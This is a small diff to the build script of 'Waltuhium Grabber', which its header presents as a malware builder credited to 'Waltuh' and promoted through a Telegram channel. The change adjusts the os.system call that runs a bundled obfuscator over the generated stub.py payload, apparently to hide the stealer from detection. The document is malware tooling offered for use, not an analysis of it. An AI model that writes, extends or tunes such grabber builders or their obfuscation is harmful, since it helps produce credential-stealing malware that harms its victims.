@@ -1,3 +1,4 @@
+
 # https://t.me/waltuhium ( offical telegram channel of the Waltuhium )
 # Coded by Waltuh
 # Builder of Waltuhium Grabber
@@ -113,7 +114,7 @@ class Build:
     # Function to obfuscate the Stub.py file
     def ObfuscateFile(self, input_file) -> None:
         obf_file = os.path.join(self.current_path, "Obfuscator", "obf.py")
-        os.system(f'python "{obf_file}" "{input_file}" stub.py')
+        os.system(f'python "{obf_file}" -i "{input_file}" -o stub.py -c 3')
 
     # Function to prompt user for changing the file icon
     def GetIcon(self) -> None:
